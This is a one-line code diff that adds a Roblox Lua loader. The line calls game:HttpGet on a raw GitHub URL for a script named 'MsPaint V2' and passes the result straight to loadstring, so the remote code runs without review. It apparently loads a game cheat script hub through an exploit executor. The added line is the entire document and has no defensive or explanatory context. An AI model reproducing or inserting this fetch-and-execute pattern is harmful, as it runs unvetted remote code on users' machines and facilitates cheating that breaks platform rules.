@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LukeScripter/MsPaint-V2/6c0d926a2a7f6f7ef413d1c21e0407fdf7f6e552/MsPaint%20V2"))();
